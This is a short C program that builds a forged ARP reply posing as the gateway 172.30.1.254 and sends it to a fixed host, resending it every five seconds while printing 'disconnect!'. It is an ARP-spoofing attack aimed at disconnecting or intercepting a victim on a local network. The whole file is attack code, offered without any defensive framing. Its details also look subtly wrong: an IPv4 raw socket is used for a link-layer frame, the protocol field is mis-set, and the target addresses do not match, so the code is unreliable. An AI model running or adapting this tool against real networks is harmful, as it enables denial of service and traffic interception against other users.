#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

#include "pckt_header.h"

int main(void) {
	int sock = socket(PF_INET, SOCK_RAW, 255);
	if(sock < 0) {
		perror("socket() error");
		return -1;
	}

	struct sockaddr_in dst_in; //dest information.
	struct arp_header arp_hdr; //create arp header.

	//set destination information
	dst_in.sin_family = AF_INET;
	dst_in.sin_port = 0;
	dst_in.sin_addr.s_addr = inet_addr("172.30.1.24");
	//

	//set arp packet
	arp_hdr.hardware_type = 1;
	arp_hdr.protocol_type = 0x0806;
	arp_hdr.hard_addr_len = 6;
	arp_hdr.proto_addr_len = 4;
	arp_hdr.operation_code = 2;
	//input src mac addr
	arp_hdr.src_mac_addr[0] = 0x08;
	arp_hdr.src_mac_addr[1] = 0x00;
	arp_hdr.src_mac_addr[2] = 0x27;
	arp_hdr.src_mac_addr[3] = 0x93;
	arp_hdr.src_mac_addr[4] = 0xc1;
	arp_hdr.src_mac_addr[5] = 0x62;
	arp_hdr.src_addr = inet_addr("172.30.1.254");
	//input dst mac addr
	arp_hdr.dst_mac_addr[0] = 0x8C;
	arp_hdr.dst_mac_addr[1] = 0x89;
	arp_hdr.dst_mac_addr[2] = 0xA5;
	arp_hdr.dst_mac_addr[3] = 0xD0;
	arp_hdr.dst_mac_addr[4] = 0x76;
	arp_hdr.dst_mac_addr[5] = 0xCB;
	arp_hdr.dst_addr = inet_addr("10.0.2.24");
	
	if(sendto(sock, &arp_hdr, sizeof(arp_hdr), 0, (struct sockaddr*)&dst_in, sizeof(dst_in)) < 0) {
		perror("sendto() error");
		return -1;
	}

	while(1) {
		printf("disconnect!\n");
		sendto(sock, &arp_hdr, sizeof(arp_hdr), 0, (struct sockaddr*)&dst_in, sizeof(dst_in));
		sleep(5);
	}

	printf("program exit!\n");
	return 0;
}
